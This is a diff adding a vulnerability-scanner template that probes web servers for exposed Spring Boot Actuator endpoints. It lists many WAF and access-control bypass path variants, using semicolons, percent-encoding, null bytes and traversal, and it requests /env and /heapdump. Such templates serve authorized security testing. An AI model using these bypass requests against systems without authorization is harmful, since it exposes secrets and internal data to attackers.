@@ -1,0 +1,206 @@
+id: springboot-actuator-discovery-bypass
+
+info:
+  name: Spring Boot Actuator Discovery - All Paths & WAF Bypasses
+  author: Shafranpackeer
+  severity: medium
+  description: |
+    Comprehensive Spring Boot Actuator endpoint discovery with multiple base path variations,
+    URL encoding bypasses, and WAF evasion techniques. Detects actuator presence even when
+    protected by firewalls or access controls.
+  reference:
+    - https://docs.spring.io/spring-boot/reference/actuator/endpoints.html
+    - https://www.wiz.io/blog/spring-boot-actuator-misconfigurations
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
+    - https://www.dsecured.com/en/articles/spring-boot-actuator-using-misconfig-to-your-advantage-paths-bypasses-techniques
+  metadata:
+    max-request: 85
+    verified: true
+  tags: springboot,actuator,misconfig,exposure,bypass,waf-bypass
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-200
+
+http:
+  - method: GET
+    path:
+      # ============================================
+      # STANDARD PATHS (Spring Boot 2.x default)
+      # ============================================
+      - "{{BaseURL}}/actuator"
+      - "{{BaseURL}}/actuator/health"
+      - "{{BaseURL}}/actuator/info"
+
+      # ============================================
+      # SPRING BOOT 1.x PATHS (root level)
+      # ============================================
+      - "{{BaseURL}}/health"
+      - "{{BaseURL}}/info"
+      - "{{BaseURL}}/env"
+      - "{{BaseURL}}/mappings"
+      - "{{BaseURL}}/metrics"
+      - "{{BaseURL}}/trace"
+      - "{{BaseURL}}/dump"
+      - "{{BaseURL}}/heapdump"
+      - "{{BaseURL}}/jolokia"
+      - "{{BaseURL}}/logfile"
+
+      # ============================================
+      # ALTERNATE BASE PATHS (custom configurations)
+      # ============================================
+      - "{{BaseURL}}/manage/health"
+      - "{{BaseURL}}/management/health"
+      - "{{BaseURL}}/admin/health"
+      - "{{BaseURL}}/monitor/health"
+      - "{{BaseURL}}/mgmt/health"
+      - "{{BaseURL}}/status/health"
+      - "{{BaseURL}}/api/actuator/health"
+      - "{{BaseURL}}/api/health"
+      - "{{BaseURL}}/v1/actuator/health"
+      - "{{BaseURL}}/v2/actuator/health"
+      - "{{BaseURL}}/internal/actuator/health"
+      - "{{BaseURL}}/private/actuator/health"
+      - "{{BaseURL}}/system/actuator/health"
+      - "{{BaseURL}}/app/actuator/health"
+      - "{{BaseURL}}/service/actuator/health"
+      - "{{BaseURL}}/message-api/actuator/health"
+
+      # ============================================
+      # SEMICOLON BYPASS (Spring parser quirk)
+      # Works because Spring removes ; but WAF/nginx doesn't
+      # ============================================
+      - "{{BaseURL}}/actuator;/health"
+      - "{{BaseURL}}/;/actuator/health"
+      - "{{BaseURL}}/actuator;.json/health"
+      - "{{BaseURL}}/actuator;/env"
+      - "{{BaseURL}}/actuator;/heapdump"
+      - "{{BaseURL}}/actuator;whatever/health"
+
+      # ============================================
+      # URL ENCODING BYPASSES (CloudFront/WAF evasion)
+      # Encode individual characters to bypass pattern matching
+      # ============================================
+      # Single character encoding
+      - "{{BaseURL}}/%61ctuator/health"           # 'a' encoded
+      - "{{BaseURL}}/a%63tuator/health"           # 'c' encoded
+      - "{{BaseURL}}/ac%74uator/health"           # 't' encoded
+      - "{{BaseURL}}/act%75ator/health"           # 'u' encoded
+      - "{{BaseURL}}/actu%61tor/health"           # 'a' encoded
+      - "{{BaseURL}}/actua%74or/health"           # 't' encoded
+      - "{{BaseURL}}/actuat%6Fr/health"           # 'o' encoded
+      - "{{BaseURL}}/actuato%72/health"           # 'r' encoded
+
+      # Double character encoding
+      - "{{BaseURL}}/a%63%74uator/health"
+      - "{{BaseURL}}/%61ctua%74or/health"
+
+      # Full path encoding
+      - "{{BaseURL}}/%61%63%74%75%61%74%6F%72/health"
+
+      # ============================================
+      # HASH/FRAGMENT BYPASS (WAF confusion)
+      # Some WAFs stop parsing at # but backend processes full path
+      # ============================================
+      - "{{BaseURL}}/actuator/health%23"
+      - "{{BaseURL}}/actuator/env%23"
+      - "{{BaseURL}}/actuator/heapdump%23"
+      - "{{BaseURL}}/actuator%23/health"
+
+      # ============================================
+      # PATH TRAVERSAL VARIATIONS
+      # ============================================
+      - "{{BaseURL}}/actuator/health/.."
+      - "{{BaseURL}}/actuator/health/../health"
+      - "{{BaseURL}}//actuator/health"
+      - "{{BaseURL}}/./actuator/health"
+      - "{{BaseURL}}/actuator//health"
+      - "{{BaseURL}}/actuator/./health"
+
+      # ============================================
+      # CASE VARIATION (some frameworks ignore case)
+      # ============================================
+      - "{{BaseURL}}/Actuator/health"
+      - "{{BaseURL}}/ACTUATOR/health"
+      - "{{BaseURL}}/actuator/Health"
+      - "{{BaseURL}}/actuator/HEALTH"
+
+      # ============================================
+      # FILE EXTENSION BYPASS
+      # ============================================
+      - "{{BaseURL}}/actuator/health.json"
+      - "{{BaseURL}}/actuator.json/health"
+      - "{{BaseURL}}/actuator/health.html"
+      - "{{BaseURL}}/actuator/health/"
+
+      # ============================================
+      # TAB CHARACTER BYPASS (0x09)
+      # ============================================
+      - "{{BaseURL}}/actuator%09/health"
+      - "{{BaseURL}}/%09actuator/health"
+
+      # ============================================
+      # NULL BYTE VARIATIONS
+      # ============================================
+      - "{{BaseURL}}/actuator%00/health"
+      - "{{BaseURL}}/actuator/health%00"
+
+      # ============================================
+      # SPRING CLOUD GATEWAY PATHS
+      # ============================================
+      - "{{BaseURL}}/gateway/routes"
+      - "{{BaseURL}}/actuator/gateway/routes"
+      - "{{BaseURL}}/gateway/actuator/health"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      # Spring Boot Actuator JSON response indicators
+      - type: word
+        part: body
+        words:
+          - '"status"'
+          - '"_links"'
+          - '"self"'
+          - '"href"'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "UP"
+          - "DOWN"
+          - "UNKNOWN"
+          - "OUT_OF_SERVICE"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/vnd.spring-boot.actuator"
+          - "application/vnd.spring-boot.actuator.v1+json"
+          - "application/vnd.spring-boot.actuator.v2+json"
+          - "application/vnd.spring-boot.actuator.v3+json"
+        condition: or
+
+      # Discovery page indicators
+      - type: word
+        part: body
+        words:
+          - "/actuator/health"
+          - "/actuator/info"
+          - "/actuator/env"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"status"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        part: body
+        regex:
+          - '/actuator/[a-zA-Z]+'
